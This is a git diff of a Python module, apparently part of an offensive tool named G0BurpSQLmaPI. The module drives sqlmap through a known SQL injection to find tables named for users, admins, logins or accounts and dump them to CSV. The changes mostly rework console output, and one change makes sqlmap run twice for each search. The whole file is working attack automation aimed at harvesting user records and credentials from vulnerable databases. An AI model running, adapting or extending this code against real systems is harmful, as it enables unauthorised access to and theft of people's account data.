@@ -2,6 +2,7 @@
 """
 G0BurpSQLmaPI - Users Dump Module
 Dumps users and finds all tables containing user data
+Preserves original sqlmap output with colors
 Author: nu11secur1ty
 License: GPL-3.0
 """
@@ -12,6 +13,7 @@ import json
 import time
 import shutil
 import subprocess
+import re
 from pathlib import Path
 
 try:
@@ -93,6 +95,7 @@ def load_exploit():
 def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
     """
     Step 1: Find ALL tables that contain 'user' in the name
+    - Shows original sqlmap output with colors
     """
     print(Fore.CYAN + "\n[+] Searching for ALL user tables..." + Style.RESET_ALL)
     
@@ -119,14 +122,19 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
     
     print(Fore.YELLOW + "[*] Finding tables containing: user, admin, member, login, account, profile" + Style.RESET_ALL)
     print(Fore.YELLOW + "[!] This may take a moment..." + Style.RESET_ALL)
+    print("-" * 60)
     
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
-        output = result.stdout + result.stderr
+        # Run sqlmap directly - PRESERVES COLORS
+        result = subprocess.run(cmd, check=False)
+        
+        # After sqlmap finishes, capture output for parsing
+        cmd_capture = cmd.copy()
+        capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
+        output = capture_result.stdout + capture_result.stderr
         
         # Extract table names from output
         tables = []
-        # Common patterns for table names in sqlmap output
         patterns = [
             r'Table: (\w+)',
             r'\|\s*(\w+)\s*\|',
@@ -137,12 +145,10 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
         for pattern in patterns:
             matches = re.findall(pattern, output)
             for match in matches:
-                # Filter only user-related tables
                 if any(keyword in match.lower() for keyword in ['user', 'admin', 'member', 'login', 'account', 'profile']):
                     if match not in tables and len(match) > 2:
                         tables.append(match)
         
-        # Remove duplicates and sort
         tables = sorted(set(tables))
         
         if tables:
@@ -151,7 +157,7 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
                 print(Fore.CYAN + f"    {i}. {table}" + Style.RESET_ALL)
             return tables
         else:
-            print(Fore.YELLOW + "\n[!] No user tables found. Trying common table names..." + Style.RESET_ALL)
+            print(Fore.YELLOW + "\n[!] No user tables found. Using common table names..." + Style.RESET_ALL)
             return ["users", "user", "admin", "members", "login", "accounts", "profiles", "user_accounts", "user_profiles"]
             
     except Exception as e:
@@ -161,6 +167,8 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
 def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
     """
     Step 2: Dump users from a specific table
+    - Shows original sqlmap output with colors
+    - sqlmap automatically saves to its output directory
     """
     print(Fore.CYAN + f"\n[+] Dumping users from table: {table_name}" + Style.RESET_ALL)
     
@@ -194,9 +202,14 @@ def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
     print("-" * 60)
     
     try:
-        subprocess.run(cmd, check=False)
-        print(Fore.GREEN + f"[+] Completed dumping {table_name}" + Style.RESET_ALL)
+        # Run sqlmap directly - PRESERVES COLORS
+        # sqlmap automatically saves results to its output directory
+        result = subprocess.run(cmd, check=False)
+        
+        print(Fore.GREEN + f"\n[+] Completed dumping {table_name}" + Style.RESET_ALL)
+        print(Fore.YELLOW + f"[*] SQLmap saved results in its default output directory" + Style.RESET_ALL)
         return True
+            
     except KeyboardInterrupt:
         print(Fore.YELLOW + f"\n[!] Skipped {table_name}" + Style.RESET_ALL)
         return False
@@ -287,10 +300,15 @@ def run_users_dump():
     print(Fore.CYAN + "\n" + "="*60)
     print(f"DUMPING {len(tables_to_dump)} USER TABLES")
     print("="*60 + Style.RESET_ALL)
+    print(Fore.CYAN + "[*] SQLmap will save results to its default output directory" + Style.RESET_ALL)
+    print(Fore.CYAN + "[*] SQLmap output will appear below with original colors:" + Style.RESET_ALL)
+    print("="*60)
     
     success_count = 0
     for i, table in enumerate(tables_to_dump, 1):
         print(Fore.CYAN + f"\n[{i}/{len(tables_to_dump)}] Processing: {table}" + Style.RESET_ALL)
+        print(Fore.CYAN + "="*60 + Style.RESET_ALL)
+        
         if dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table):
             success_count += 1
     
@@ -299,8 +317,8 @@ def run_users_dump():
     print("USERS DUMP COMPLETE")
     print("="*60 + Style.RESET_ALL)
     print(Fore.GREEN + f"✅ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
-    print(Fore.GREEN + f"📁 Output files saved in sqlmap output directory" + Style.RESET_ALL)
-    print(Fore.YELLOW + "💡 Check sqlmap output for CSV files with user data" + Style.RESET_ALL)
+    print(Fore.YELLOW + "📁 SQLmap saved CSV files in its default output directory" + Style.RESET_ALL)
+    print(Fore.CYAN + "💡 Check sqlmap output directory for CSV files with user data" + Style.RESET_ALL)
     print("="*60)
     
     input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
